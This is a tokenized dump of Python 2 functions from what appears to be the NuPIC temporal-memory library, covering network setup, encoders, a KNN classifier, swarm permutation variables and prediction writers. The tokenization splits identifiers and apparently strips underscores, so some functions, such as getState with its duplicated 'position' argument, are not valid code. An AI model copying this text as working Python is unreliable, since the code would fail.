def create Network ( data Source ) : with open ( PARAMS PATH , "r" ) as f : model Params = yaml . safe load ( f ) [ "model Params" ] # Create a network that will hold the regions. network = Network ( ) # Add a sensor region. network . add Region ( "sensor" , "py.Record Sensor" , '{}' ) # Set the encoder and data source of the sensor region. sensor Region = network . regions [ "sensor" ] . get Self ( ) sensor Region . encoder = create Encoder ( model Params [ "sensor Params" ] [ "encoders" ] ) sensor Region . data Source = data Source # Make sure the SP input width matches the sensor region output width. model Params [ "sp Params" ] [ "input Width" ] = sensor Region . encoder . get Width ( ) # Add SP and TM regions. network . add Region ( "SP" , "py.SP Region" , json . dumps ( model Params [ "sp Params" ] ) ) network . add Region ( "TM" , "py.TM Region" , json . dumps ( model Params [ "tm Params" ] ) ) # Add a classifier region. cl Name = "py.%s" % model Params [ "cl Params" ] . pop ( "region Name" ) network . add Region ( "classifier" , cl Name , json . dumps ( model Params [ "cl Params" ] ) ) # Add all links create Sensor To Classifier Links ( network , "sensor" , "classifier" ) create Data Out Link ( network , "sensor" , "SP" ) create Feed Forward Link ( network , "SP" , "TM" ) create Feed Forward Link ( network , "TM" , "classifier" ) # Reset links are optional, since the sensor region does not send resets. create Reset Link ( network , "sensor" , "SP" ) create Reset Link ( network , "sensor" , "TM" ) # Make sure all objects are initialized. network . initialize ( ) return network
def get Prediction Results ( network , cl Region Name ) : classifier Region = network . regions [ cl Region Name ] actual Values = classifier Region . get Output Data ( "actual Values" ) probabilities = classifier Region . get Output Data ( "probabilities" ) steps = classifier Region . get Self ( ) . steps List N = classifier Region . get Self ( ) . max Category Count results = { step : { } for step in steps } for i in range ( len ( steps ) ) : # step Probabilities are probabilities for this prediction step only. step Probabilities = probabilities [ i * N : ( i + 1 ) * N - 1 ] most Likely Category Idx = step Probabilities . argmax ( ) predicted Value = actual Values [ most Likely Category Idx ] prediction Confidence = step Probabilities [ most Likely Category Idx ] results [ steps [ i ] ] [ "predicted Value" ] = predicted Value results [ steps [ i ] ] [ "prediction Confidence" ] = prediction Confidence return results
def run Hotgym ( num Records ) : # Create a data source for the network. data Source = File Record Stream ( stream ID = INPUT FILE PATH ) num Records = min ( num Records , data Source . get Data Row Count ( ) ) network = create Network ( data Source ) # Set predicted field network . regions [ "sensor" ] . set Parameter ( "predicted Field" , "consumption" ) # Enable learning for all regions. network . regions [ "SP" ] . set Parameter ( "learning Mode" , 1 ) network . regions [ "TM" ] . set Parameter ( "learning Mode" , 1 ) network . regions [ "classifier" ] . set Parameter ( "learning Mode" , 1 ) # Enable inference for all regions. network . regions [ "SP" ] . set Parameter ( "inference Mode" , 1 ) network . regions [ "TM" ] . set Parameter ( "inference Mode" , 1 ) network . regions [ "classifier" ] . set Parameter ( "inference Mode" , 1 ) results = [ ] N = 1 # Run the network, N iterations at a time. for iteration in range ( 0 , num Records , N ) : network . run ( N ) prediction Results = get Prediction Results ( network , "classifier" ) one Step = prediction Results [ 1 ] [ "predicted Value" ] one Step Confidence = prediction Results [ 1 ] [ "prediction Confidence" ] five Step = prediction Results [ 5 ] [ "predicted Value" ] five Step Confidence = prediction Results [ 5 ] [ "prediction Confidence" ] result = ( one Step , one Step Confidence * 100 , five Step , five Step Confidence * 100 ) print "1-step: {:16} ({:4.4}%)\t 5-step: {:16} ({:4.4}%)" . format ( * result ) results . append ( result ) return results
def run ( self ) : self . logger . debug ( "Starting Dummy Model: model ID=%s;" % ( self . model ID ) ) # ========================================================================= # Initialize periodic activities (e.g., for model result updates) # ========================================================================= periodic = self . init Periodic Activities ( ) self . optimized Metric Label = self . optimize Key Pattern self . report Metric Labels = [ self . optimize Key Pattern ] # ========================================================================= # Create our top-level loop-control iterator # ========================================================================= if self . iterations >= 0 : iter Tracker = iter ( xrange ( self . iterations ) ) else : iter Tracker = iter ( itertools . count ( ) ) # ========================================================================= # This gets set in the unit tests. It tells the worker to sys exit #  the first N models. This is how we generate orphaned models do Sys Exit = False if self . sys Exit Model Range is not None : model And Counters = self . jobs DAO . models Get Update Counters ( self . job ID ) model I Ds = [ x [ 0 ] for x in model And Counters ] model I Ds . sort ( ) ( beg , end ) = self . sys Exit Model Range if self . model ID in model I Ds [ int ( beg ) : int ( end ) ] : do Sys Exit = True if self . delay Model Range is not None : model And Counters = self . jobs DAO . models Get Update Counters ( self . job ID ) model I Ds = [ x [ 0 ] for x in model And Counters ] model I Ds . sort ( ) ( beg , end ) = self . delay Model Range if self . model ID in model I Ds [ int ( beg ) : int ( end ) ] : time . sleep ( 10 ) # DEBUG!!!! infinite wait if we have 50 models #if len(model I Ds) >= 50: #  job Cancel = self. jobs DAO.job Get Fields(self. job ID, ['cancel'])[0] #  while not job Cancel: #    time.sleep(1) #    job Cancel = self. jobs DAO.job Get Fields(self. job ID, ['cancel'])[0] if self . err Model Range is not None : model And Counters = self . jobs DAO . models Get Update Counters ( self . job ID ) model I Ds = [ x [ 0 ] for x in model And Counters ] model I Ds . sort ( ) ( beg , end ) = self . err Model Range if self . model ID in model I Ds [ int ( beg ) : int ( end ) ] : raise Runtime Error ( "Exiting with error due to err Model Range parameter" ) # ========================================================================= # Delay, if necessary if self . delay is not None : time . sleep ( self . delay ) # ========================================================================= # Run it! # ========================================================================= self . current Record Index = 0 while True : # ========================================================================= # Check if the model should be stopped # ========================================================================= # If killed by a terminator, stop running if self . is Killed : break # If job stops or hypersearch ends, stop running if self . is Canceled : break # If model is mature, stop running ONLY IF  we are not the best model # for the job. Otherwise, keep running so we can keep returning # predictions to the user if self . is Mature : if not self . is Best Model : self . cmp Reason = self . jobs DAO . CMPL REASON STOPPED break else : self . cmp Reason = self . jobs DAO . CMPL REASON EOF # ========================================================================= # Get the the next record, and "write it" # ========================================================================= try : self . current Record Index = next ( iter Tracker ) except Stop Iteration : break # "Write" a dummy output value. This is used to test that the batched # writing works properly self . write Prediction ( Model Result ( None , None , None , None ) ) periodic . tick ( ) # ========================================================================= # Compute wait times. See if model should exit # ========================================================================= if self . should Sys Exit ( self . current Record Index ) : sys . exit ( 1 ) # Simulate computation time if self . busy Wait Time is not None : time . sleep ( self . busy Wait Time ) self . compute Wait Time ( ) # Asked to abort after so many iterations? if do Sys Exit : sys . exit ( 1 ) # Asked to raise a job Fail Exception? if self . job Fail Err : raise utils . Job Fail Exception ( "E10000" , "dummy Model's job Fail Err was True." ) # ========================================================================= # Handle final operations # ========================================================================= if self . do Finalize : if not self . make Checkpoint : self . model = None # Delay finalization operation if self . final Delay is not None : time . sleep ( self . final Delay ) self . finalize ( ) self . logger . info ( "Finished: model ID=%r " % ( self . model ID ) ) return ( self . cmp Reason , None )
def get Description ( self ) : description = { 'name' : self . name , 'fields' : [ f . name for f in self . fields ] , 'num Records by field' : [ f . num Records for f in self . fields ] } return description
def generate Records ( self , records ) : if self . verbosity > 0 : print 'Generating' , len ( records ) , 'records...' for record in records : self . generate Record ( record )
def get Record ( self , n = None ) : if n is None : assert len ( self . fields ) > 0 n = self . fields [ 0 ] . num Records - 1 assert ( all ( field . num Records > n for field in self . fields ) ) record = [ field . values [ n ] for field in self . fields ] return record
def get All Records ( self ) : values = [ ] num Records = self . fields [ 0 ] . num Records assert ( all ( field . num Records == num Records for field in self . fields ) ) for x in range ( num Records ) : values . append ( self . get Record ( x ) ) return values
def add Values To Field ( self , i , num Values ) : assert ( len ( self . fields ) > i ) values = [ self . add Value To Field ( i ) for n in range ( num Values ) ] return values
def get SD Rfor Value ( self , i , j ) : assert len ( self . fields ) > i assert self . fields [ i ] . num Records > j encoding = self . fields [ i ] . encodings [ j ] return encoding
def get Zeroed Out Encoding ( self , n ) : assert all ( field . num Records > n for field in self . fields ) encoding = np . concatenate ( [ field . encoder . encode ( SENTINEL VALUE FOR MISSING DATA ) if field . is Predicted Field else field . encodings [ n ] for field in self . fields ] ) return encoding
def get Totaln ( self ) : n = sum ( [ field . n for field in self . fields ] ) return n
def get Totalw ( self ) : w = sum ( [ field . w for field in self . fields ] ) return w
def get Encoding ( self , n ) : assert ( all ( field . num Encodings > n for field in self . fields ) ) encoding = np . concatenate ( [ field . encodings [ n ] for field in self . fields ] ) return encoding
def get All Encodings ( self ) : num Encodings = self . fields [ 0 ] . num Encodings assert ( all ( field . num Encodings == num Encodings for field in self . fields ) ) encodings = [ self . get Encoding ( index ) for index in range ( num Encodings ) ] return encodings
def remove All Records ( self ) : for field in self . fields : field . encodings , field . values = [ ] , [ ] field . num Records , field . num Encodings = ( 0 , 0 )
def encode Value ( self , value , to Be Added = True ) : encoded Value = np . array ( self . encoder . encode ( value ) , dtype = real D Type ) if to Be Added : self . encodings . append ( encoded Value ) self . num Encodings += 1 return encoded Value
def set Types ( self , encoder Spec ) : if self . encoder Type is None : if self . data Type in [ 'int' , 'float' ] : self . encoder Type = 'adaptive Scalar' elif self . data Type == 'string' : self . encoder Type = 'category' elif self . data Type in [ 'date' , 'datetime' ] : self . encoder Type = 'date' if self . data Type is None : if self . encoder Type in [ 'scalar' , 'adaptive Scalar' ] : self . data Type = 'float' elif self . encoder Type in [ 'category' , 'enumeration' ] : self . data Type = 'string' elif self . encoder Type in [ 'date' , 'datetime' ] : self . data Type = 'datetime'
def get Scalars ( self , input ) : if input == SENTINEL VALUE FOR MISSING DATA : return numpy . array ( [ None ] ) else : return numpy . array ( [ self . category To Index . get ( input , 0 ) ] )
def get Bucket Indices ( self , input ) : # Get the bucket index from the underlying scalar encoder if input == SENTINEL VALUE FOR MISSING DATA : return [ None ] else : return self . encoder . get Bucket Indices ( self . category To Index . get ( input , 0 ) )
def decode ( self , encoded , parent Field Name = '' ) : # Get the scalar values from the underlying scalar encoder ( fields Dict , field Names ) = self . encoder . decode ( encoded ) if len ( fields Dict ) == 0 : return ( fields Dict , field Names ) # Expect only 1 field assert ( len ( fields Dict ) == 1 ) # Get the list of categories the scalar values correspond to and #  generate the description from the category name(s). ( in Ranges , in Desc ) = fields Dict . values ( ) [ 0 ] out Ranges = [ ] desc = "" for ( min V , max V ) in in Ranges : min V = int ( round ( min V ) ) max V = int ( round ( max V ) ) out Ranges . append ( ( min V , max V ) ) while min V <= max V : if len ( desc ) > 0 : desc += ", " desc += self . index To Category [ min V ] min V += 1 # Return result if parent Field Name != '' : field Name = "%s.%s" % ( parent Field Name , self . name ) else : field Name = self . name return ( { field Name : ( out Ranges , desc ) } , [ field Name ] )
def get Bucket Values ( self ) : if self . bucket Values is None : num Buckets = len ( self . encoder . get Bucket Values ( ) ) self . bucket Values = [ ] for bucket Index in range ( num Buckets ) : self . bucket Values . append ( self . get Bucket Info ( [ bucket Index ] ) [ 0 ] . value ) return self . bucket Values
def get Bucket Info ( self , buckets ) : # For the category encoder, the bucket index is the category index bucket Info = self . encoder . get Bucket Info ( buckets ) [ 0 ] category Index = int ( round ( bucket Info . value ) ) category = self . index To Category [ category Index ] return [ Encoder Result ( value = category , scalar = category Index , encoding = bucket Info . encoding ) ]
def top Down Compute ( self , encoded ) : encoder Result = self . encoder . top Down Compute ( encoded ) [ 0 ] value = encoder Result . value category Index = int ( round ( value ) ) category = self . index To Category [ category Index ] return Encoder Result ( value = category , scalar = category Index , encoding = encoder Result . encoding )
def get Stream Def ( self , model Description ) : #-------------------------------------------------------------------------- # Generate the string containing the aggregation settings. aggregation Period = { 'days' : 0 , 'hours' : 0 , 'microseconds' : 0 , 'milliseconds' : 0 , 'minutes' : 0 , 'months' : 0 , 'seconds' : 0 , 'weeks' : 0 , 'years' : 0 , } # Honor any overrides provided in the stream definition agg Functions Dict = { } if 'aggregation' in model Description [ 'stream Def' ] : for key in aggregation Period . keys ( ) : if key in model Description [ 'stream Def' ] [ 'aggregation' ] : aggregation Period [ key ] = model Description [ 'stream Def' ] [ 'aggregation' ] [ key ] if 'fields' in model Description [ 'stream Def' ] [ 'aggregation' ] : for ( field Name , func ) in model Description [ 'stream Def' ] [ 'aggregation' ] [ 'fields' ] : agg Functions Dict [ field Name ] = str ( func ) # Do we have any aggregation at all? has Aggregation = False for v in aggregation Period . values ( ) : if v != 0 : has Aggregation = True break # Convert the agg Functions Dict to a list agg Function List = agg Functions Dict . items ( ) aggregation Info = dict ( aggregation Period ) aggregation Info [ 'fields' ] = agg Function List stream Def = copy . deepcopy ( model Description [ 'stream Def' ] ) stream Def [ 'aggregation' ] = copy . deepcopy ( aggregation Info ) return stream Def
def engine Services Running ( ) : process = subprocess . Popen ( [ "ps" , "aux" ] , stdout = subprocess . PIPE ) stdout = process . communicate ( ) [ 0 ] result = process . returncode if result != 0 : raise Runtime Error ( "Unable to check for running client job manager" ) # See if the CJM is running running = False for line in stdout . split ( "\n" ) : if "python" in line and "clientjobmanager.client job manager" in line : running = True break return running
def get Data ( self , n ) : records = [ self . get Next ( ) for x in range ( n ) ] return records
def generate ( self ) : candidates = np . array ( range ( self . n ) , np . uint32 ) for i in xrange ( self . num ) : self . random . shuffle ( candidates ) pattern = candidates [ 0 : self . get W ( ) ] self . patterns [ i ] = set ( pattern )
def get W ( self ) : w = self . w if type ( w ) is list : return w [ self . random . get U Int32 ( len ( w ) ) ] else : return w
def generate ( self ) : n = self . n w = self . w assert type ( w ) is int , "List for w not supported" for i in xrange ( n / w ) : pattern = set ( xrange ( i * w , ( i + 1 ) * w ) ) self . patterns [ i ] = pattern
def encode Into Array ( self , value , output ) : dense Input = numpy . zeros ( output . shape ) try : dense Input [ value ] = 1 except Index Error : if isinstance ( value , numpy . ndarray ) : raise Value Error ( "Numpy array must have integer dtype but got {}" . format ( value . dtype ) ) raise super ( Sparse Pass Through Encoder , self ) . encode Into Array ( dense Input , output )
def require Anomaly Model ( func ) : @ wraps ( func ) def decorator ( self , * args , * * kwargs ) : if not self . get Inference Type ( ) == Inference Type . Temporal Anomaly : raise Runtime Error ( "Method required a Temporal Anomaly model." ) if self . get Anomaly Classifier ( ) is None : raise Runtime Error ( "Model does not support this command. Model must" "be an active anomaly Detector model." ) return func ( self , * args , * * kwargs ) return decorator
def anomaly Compute ( self ) : inference Type = self . get Inference Type ( ) inferences = { } sp = self . get SP Region ( ) score = None if inference Type == Inference Type . Nontemporal Anomaly : score = sp . get Output Data ( "anomaly Score" ) [ 0 ] #TODO move from SP to Anomaly ? elif inference Type == Inference Type . Temporal Anomaly : tm = self . get TP Region ( ) if sp is not None : active Columns = sp . get Output Data ( "bottom Up Out" ) . nonzero ( ) [ 0 ] else : sensor = self . get Sensor Region ( ) active Columns = sensor . get Output Data ( 'data Out' ) . nonzero ( ) [ 0 ] if not self . predicted Field Name in self . input : raise Value Error ( "Expected predicted field '%s' in input row, but was not found!" % self . predicted Field Name ) # Calculate the anomaly score using the active columns # and previous predicted columns. score = tm . get Output Data ( "anomaly Score" ) [ 0 ] # Calculate the classifier's output and use the result as the anomaly # label. Stores as string of results. # TODO: make labels work with non-SP models if sp is not None : self . get Anomaly Classifier ( ) . set Parameter ( "active Column Count" , len ( active Columns ) ) self . get Anomaly Classifier ( ) . prepare Inputs ( ) self . get Anomaly Classifier ( ) . compute ( ) labels = self . get Anomaly Classifier ( ) . get Self ( ) . get Label Results ( ) inferences [ Inference Element . anomaly Label ] = "%s" % labels inferences [ Inference Element . anomaly Score ] = score return inferences
def get Classifier Region ( self ) : if ( self . net Info . net is not None and "Classifier" in self . net Info . net . regions ) : return self . net Info . net . regions [ "Classifier" ] else : return None
def get State ( self ) : return dict ( position = self . position , position = self . get Position ( ) , velocity = self . velocity , best Position = self . best Position , best Result = self . best Result )
def set State ( self , state ) : self . position = state [ ' position' ] self . velocity = state [ 'velocity' ] self . best Position = state [ 'best Position' ] self . best Result = state [ 'best Result' ]
def get Position ( self ) : if self . step Size is None : return self . position # Find nearest step num Steps = ( self . position - self . min ) / self . step Size num Steps = int ( round ( num Steps ) ) position = self . min + ( num Steps * self . step Size ) position = max ( self . min , position ) position = min ( self . max , position ) return position
def agitate ( self ) : # Increase velocity enough that it will be higher the next time # new Position() is called. We know that new Position multiplies by inertia, # so take that into account. self . velocity *= 1.5 / self . inertia # Clip velocity max V = ( self . max - self . min ) / 2 if self . velocity > max V : self . velocity = max V elif self . velocity < - max V : self . velocity = - max V # if we at the max or min, reverse direction if self . position == self . max and self . velocity > 0 : self . velocity *= - 1 if self . position == self . min and self . velocity < 0 : self . velocity *= - 1
def new Position ( self , global Best Position , rng ) : # First, update the velocity. The new velocity is given as: # v = (inertia * v)  + (cog Rate * r1 * (local Best-pos)) #                    + (soc Rate * r2 * (global Best-pos)) # # where r1 and r2 are random numbers between 0 and 1.0 lb = float ( Configuration . get ( "nupic.hypersearch.random Lower Bound" ) ) ub = float ( Configuration . get ( "nupic.hypersearch.random Upper Bound" ) ) self . velocity = ( self . velocity * self . inertia + rng . uniform ( lb , ub ) * self . cog Rate * ( self . best Position - self . get Position ( ) ) ) if global Best Position is not None : self . velocity += rng . uniform ( lb , ub ) * self . soc Rate * ( global Best Position - self . get Position ( ) ) # update position based on velocity self . position += self . velocity # Clip it self . position = max ( self . min , self . position ) self . position = min ( self . max , self . position ) # Return it return self . get Position ( )
def push Away From ( self , other Positions , rng ) : # If min and max are the same, nothing to do if self . max == self . min : return # How many potential other positions to evaluate? num Positions = len ( other Positions ) * 4 if num Positions == 0 : return # Assign a weight to each potential position based on how close it is # to other particles. step Size = float ( self . max - self . min ) / num Positions positions = numpy . arange ( self . min , self . max + step Size , step Size ) # Get rid of duplicates. num Positions = len ( positions ) weights = numpy . zeros ( num Positions ) # Assign a weight to each potential position, based on a gaussian falloff # from each existing variable. The weight of a variable to each potential # position is given as: #    e ^ -(dist^2/step Size^2) max Distance Sq = - 1 * ( step Size ** 2 ) for pos in other Positions : distances = pos - positions var Weights = numpy . exp ( numpy . power ( distances , 2 ) / max Distance Sq ) weights += var Weights # Put this particle at the position with smallest weight. position Idx = weights . argmin ( ) self . position = positions [ position Idx ] # Set its best position to this. self . best Position = self . get Position ( ) # Give it a random direction. self . velocity *= rng . choice ( [ 1 , - 1 ] )
def reset Velocity ( self , rng ) : max Velocity = ( self . max - self . min ) / 5.0 self . velocity = max Velocity #min(abs(self. velocity), max Velocity) self . velocity *= rng . choice ( [ 1 , - 1 ] )
def get Position ( self ) : position = super ( Permute Int , self ) . get Position ( ) position = int ( round ( position ) ) return position
def get State ( self ) : return dict ( position = self . get Position ( ) , position = self . get Position ( ) , velocity = None , best Position = self . choices [ self . best Position Idx ] , best Result = self . best Result )
def set State ( self , state ) : self . position Idx = self . choices . index ( state [ ' position' ] ) self . best Position Idx = self . choices . index ( state [ 'best Position' ] ) self . best Result = state [ 'best Result' ]
def new Position ( self , global Best Position , rng ) : # Compute the mean score per choice. num Choices = len ( self . choices ) mean Score Per Choice = [ ] overall Sum = 0 num Results = 0 for i in range ( num Choices ) : if len ( self . results Per Choice [ i ] ) > 0 : data = numpy . array ( self . results Per Choice [ i ] ) mean Score Per Choice . append ( data . mean ( ) ) overall Sum += data . sum ( ) num Results += data . size else : mean Score Per Choice . append ( None ) if num Results == 0 : overall Sum = 1.0 num Results = 1 # For any choices we don't have a result for yet, set to the overall mean. for i in range ( num Choices ) : if mean Score Per Choice [ i ] is None : mean Score Per Choice [ i ] = overall Sum / num Results # Now, pick a new choice based on the above probabilities. Note that the #  best result is the lowest result. We want to make it more likely to #  pick the choice that produced the lowest results. So, we need to invert #  the scores (some Large Number - score). mean Score Per Choice = numpy . array ( mean Score Per Choice ) # Invert meaning. mean Score Per Choice = ( 1.1 * mean Score Per Choice . max ( ) ) - mean Score Per Choice # If you want the scores to quickly converge to the best choice, raise the # results to a power. This will cause lower scores to become lower # probability as you see more results, until it eventually should # assymptote to only choosing the best choice. if self . fix Early : mean Score Per Choice **= ( num Results * self . fix Early Factor / num Choices ) # Normalize. total = mean Score Per Choice . sum ( ) if total == 0 : total = 1.0 mean Score Per Choice /= total # Get distribution and choose one based on those probabilities. distribution = mean Score Per Choice . cumsum ( ) r = rng . random ( ) * distribution [ - 1 ] choice Idx = numpy . where ( r <= distribution ) [ 0 ] [ 0 ] self . position Idx = choice Idx return self . get Position ( )
def push Away From ( self , other Positions , rng ) : # Get the count of how many in each position positions = [ self . choices . index ( x ) for x in other Positions ] position Counts = [ 0 ] * len ( self . choices ) for pos in positions : position Counts [ pos ] += 1 self . position Idx = numpy . array ( position Counts ) . argmin ( ) self . best Position Idx = self . position Idx
def open Datafile ( self , model Result ) : # Write reset bit reset Field Meta = Field Meta Info ( name = "reset" , type = Field Meta Type . integer , special = Field Meta Special . reset ) self . output Fields Meta . append ( reset Field Meta ) # ----------------------------------------------------------------------- # Write each of the raw inputs that go into the encoders raw Input = model Result . raw Input raw Fields = raw Input . keys ( ) raw Fields . sort ( ) for field in raw Fields : if field . startswith ( ' ' ) or field == 'reset' : continue value = raw Input [ field ] meta = Field Meta Info ( name = field , type = Field Meta Type . string , special = Field Meta Special . none ) self . output Fields Meta . append ( meta ) self . raw Input Names . append ( field ) # ----------------------------------------------------------------------- # Handle each of the inference elements for inference Element , value in model Result . inferences . iteritems ( ) : inference Label = Inference Element . get Label ( inference Element ) # TODO: Right now we assume list inferences are associated with # The input field metadata if type ( value ) in ( list , tuple ) : # Append input and prediction field meta-info self . output Fields Meta . extend ( self . get List Meta Info ( inference Element ) ) elif isinstance ( value , dict ) : self . output Fields Meta . extend ( self . get Dict Meta Info ( inference Element , value ) ) else : if Inference Element . get Input Element ( inference Element ) : self . output Fields Meta . append ( Field Meta Info ( name = inference Label + ".actual" , type = Field Meta Type . string , special = '' ) ) self . output Fields Meta . append ( Field Meta Info ( name = inference Label , type = Field Meta Type . string , special = '' ) ) if self . metric Names : for metric Name in self . metric Names : metric Field = Field Meta Info ( name = metric Name , type = Field Meta Type . float , special = Field Meta Special . none ) self . output Fields Meta . append ( metric Field ) # Create the inference directory for our experiment inference Dir = File Utils . create Experiment Inference Dir ( self . experiment Dir ) # Consctruct the prediction dataset file path filename = ( self . label + "." + opf utils . Inference Type . get Label ( self . inference Type ) + ".prediction Log.csv" ) self . dataset Path = os . path . join ( inference Dir , filename ) # Create the output dataset print "OPENING OUTPUT FOR PREDICTION WRITER AT: %r" % self . dataset Path print "Prediction field-meta: %r" % ( [ tuple ( i ) for i in self . output Fields Meta ] , ) self . dataset = File Record Stream ( stream ID = self . dataset Path , write = True , fields = self . output Fields Meta ) # Copy data from checkpoint cache if self . checkpoint Cache is not None : self . checkpoint Cache . seek ( 0 ) reader = csv . reader ( self . checkpoint Cache , dialect = 'excel' ) # Skip header row try : header = reader . next ( ) except Stop Iteration : print "Empty record checkpoint initializer for %r" % ( self . dataset Path , ) else : assert tuple ( self . dataset . get Field Names ( ) ) == tuple ( header ) , "dataset.get Field Names(): %r; prediction Checkpoint Field Names: %r" % ( tuple ( self . dataset . get Field Names ( ) ) , tuple ( header ) ) # Copy the rows from checkpoint num Rows Copied = 0 while True : try : row = reader . next ( ) except Stop Iteration : break #print "DEBUG: restoring row from checkpoint: %r" % (row,) self . dataset . append Record ( row ) num Rows Copied += 1 self . dataset . flush ( ) print "Restored %d rows from checkpoint for %r" % ( num Rows Copied , self . dataset Path ) # Dispose of our checkpoint cache self . checkpoint Cache . close ( ) self . checkpoint Cache = None return
def get Dict Meta Info ( self , inference Element , inference Dict ) : field Meta Info = [ ] inference Label = Inference Element . get Label ( inference Element ) if Inference Element . get Input Element ( inference Element ) : field Meta Info . append ( Field Meta Info ( name = inference Label + ".actual" , type = Field Meta Type . string , special = '' ) ) keys = sorted ( inference Dict . keys ( ) ) for key in keys : field Meta Info . append ( Field Meta Info ( name = inference Label + "." + str ( key ) , type = Field Meta Type . string , special = '' ) ) return field Meta Info
def modify Bits ( input Val , max Changes ) : changes = np . random . random integers ( 0 , max Changes , 1 ) [ 0 ] if changes == 0 : return input Val input Width = len ( input Val ) what To Change = np . random . random integers ( 0 , 41 , changes ) running Index = - 1 num Mods Done = 0 for i in xrange ( input Width ) : if num Mods Done >= changes : break if input Val [ i ] == 1 : running Index += 1 if running Index in what To Change : if i != 0 and input Val [ i - 1 ] == 0 : input Val [ i - 1 ] = 1 input Val [ i ] = 0 return input Val
def clean ( s ) : lines = [ l . rstrip ( ) for l in s . split ( '\n' ) ] return '\n' . join ( lines )
def main ( ) : init Logging ( verbose = True ) # Initialize PRN Gs init Experiment Prng ( ) # Mock out the creation of the SDR Classifier. @ staticmethod def mock Create ( * args , * * kwargs ) : kwargs . pop ( 'implementation' , None ) return SDR Classifier Diff ( * args , * * kwargs ) SDR Classifier Factory . create = mock Create # Run it! run Experiment ( sys . argv [ 1 : ] )
def job Cancel All Running Jobs ( self ) : # Get a database connection and cursor with Connection Factory . get ( ) as conn : query = 'UPDATE %s SET cancel=TRUE WHERE status<>%%s ' % ( self . jobs Table Name , ) conn . cursor . execute ( query , [ self . STATUS COMPLETED ] ) return
def init Ephemerals ( self ) : self . first Compute Call = True self . accuracy = None self . proto Scores = None self . category Distances = None self . knn = knn classifier . KNN Classifier ( * * self . knn Params ) for x in ( ' partitions' , ' use Auxiliary' , ' do Sphering' , ' scan Info' , ' proto Scores' ) : if not hasattr ( self , x ) : setattr ( self , x , None )
def disable Tap ( self ) : if self . tap File In is not None : self . tap File In . close ( ) self . tap File In = None if self . tap File Out is not None : self . tap File Out . close ( ) self . tap File Out = None
def store Sample ( self , input Vector , true Cat Index , partition = 0 ) : # If this is the first sample, then allocate a numpy array # of the appropriate size in which to store all samples. if self . samples is None : self . samples = numpy . zeros ( ( 0 , len ( input Vector ) ) , dtype = Real Numpy D Type ) assert self . labels is None self . labels = [ ] # Add the sample vector and category lable self . samples = numpy . concatenate ( ( self . samples , numpy . atleast 2d ( input Vector ) ) , axis = 0 ) self . labels += [ true Cat Index ] # Add the partition ID if self . partitions is None : self . partitions = [ ] if partition is None : partition = 0 self . partitions += [ partition ]
def finish Learning ( self ) : if self . do Sphering : self . finish Sphering ( ) self . knn . finish Learning ( ) # Compute leave-one-out validation accuracy if # we actually received non-trivial partition info self . accuracy = None
def next ( self , new Value ) : new Average , self . sliding Window , self . total = self . compute ( self . sliding Window , self . total , new Value , self . window Size ) return new Average
def add Instance ( self , ground Truth , prediction , record = None , result = None ) : self . value = self . avg ( prediction )
def get Input Value ( self , obj , field Name ) : if isinstance ( obj , dict ) : if not field Name in obj : known Fields = ", " . join ( key for key in obj . keys ( ) if not key . startswith ( " " ) ) raise Value Error ( "Unknown field name '%s' in input record. Known fields are '%s'.\n" "This could be because input headers are mislabeled, or because " "input data rows do not contain a value for '%s'." % ( field Name , known Fields , field Name ) ) return obj [ field Name ] else : return getattr ( obj , field Name )
def create Input ( self ) : print "-" * 70 + "Creating a random input vector" + "-" * 70 #clear the input Array to zero before creating a new input vector self . input Array [ 0 : ] = 0 for i in range ( self . input Size ) : #randrange returns 0 or 1 self . input Array [ i ] = random . randrange ( 2 )
def run ( self ) : print "-" * 80 + "Computing the SDR" + "-" * 80 #active Array[column]=1 if column is active after spatial pooling self . sp . compute ( self . input Array , True , self . active Array ) print self . active Array . nonzero ( )
def clear ( self ) : self . Memory = None self . num Patterns = 0 self . M = None self . category List = [ ] self . partition Id List = [ ] self . partition Id Map = { } self . finished Learning = False self . iteration Idx = - 1 # Fixed capacity KNN if self . max Stored Patterns > 0 : assert self . use Sparse Memory , ( "Fixed capacity KNN is implemented only " "in the sparse memory mode" ) self . fixed Capacity = True self . category Recency List = [ ] else : self . fixed Capacity = False # Cached value of the store prototype sizes self . proto Sizes = None # Used by PCA self . s = None self . vt = None self . nc = None self . mean = None # Used by Network Builder self . specific Index Training = False self . next Training Indices = None
def add Partition Id ( self , index , partition Id = None ) : if partition Id is None : self . partition Id List . append ( numpy . inf ) else : self . partition Id List . append ( partition Id ) indices = self . partition Id Map . get ( partition Id , [ ] ) indices . append ( index ) self . partition Id Map [ partition Id ] = indices
def rebuild Partition Id Map ( self , partition Id List ) : self . partition Id Map = { } for row , partition Id in enumerate ( partition Id List ) : indices = self . partition Id Map . get ( partition Id , [ ] ) indices . append ( row ) self . partition Id Map [ partition Id ] = indices
def rewind ( self ) : # Superclass rewind super ( File Record Stream , self ) . rewind ( ) self . close ( ) self . file = open ( self . filename , self . mode ) self . reader = csv . reader ( self . file , dialect = "excel" ) # Skip header rows self . reader . next ( ) self . reader . next ( ) self . reader . next ( ) # Reset record count, etc. self . record Count = 0
def get Start Row ( self , bookmark ) : book Mark Dict = json . loads ( bookmark ) realpath = os . path . realpath ( self . filename ) book Mark File = book Mark Dict . get ( 'filepath' , None ) if book Mark File != realpath : print ( "Ignoring bookmark due to mismatch between File's " "filename realpath vs. bookmark; realpath: %r; bookmark: %r" ) % ( realpath , book Mark Dict ) return 0 else : return book Mark Dict [ 'current Row' ]
def get Custom Dict ( cls ) : if not os . path . exists ( cls . get Path ( ) ) : return dict ( ) properties = Configuration . read Config File ( os . path . basename ( cls . get Path ( ) ) , os . path . dirname ( cls . get Path ( ) ) ) values = dict ( ) for prop Name in properties : if 'value' in properties [ prop Name ] : values [ prop Name ] = properties [ prop Name ] [ 'value' ] return values
def set Path ( cls ) : cls . path = os . path . join ( os . environ [ 'NTA DYNAMIC CONF DIR' ] , cls . custom File Name )
def advance Phase ( self ) : self . current Phase = self . phase Cycler . next ( ) self . current Phase . enter Phase ( ) return
def aggr mean ( in List ) : aggr Sum = 0 non None = 0 for elem in in List : if elem != SENTINEL VALUE FOR MISSING DATA : aggr Sum += elem non None += 1 if non None != 0 : return aggr Sum / non None else : return None
def aggr mode ( in List ) : value Counts = dict ( ) non None = 0 for elem in in List : if elem == SENTINEL VALUE FOR MISSING DATA : continue non None += 1 if elem in value Counts : value Counts [ elem ] += 1 else : value Counts [ elem ] = 1 # Get the most common one if non None == 0 : return None # Sort by counts sorted Counts = value Counts . items ( ) sorted Counts . sort ( cmp = lambda x , y : x [ 1 ] - y [ 1 ] , reverse = True ) return sorted Counts [ 0 ] [ 0 ]
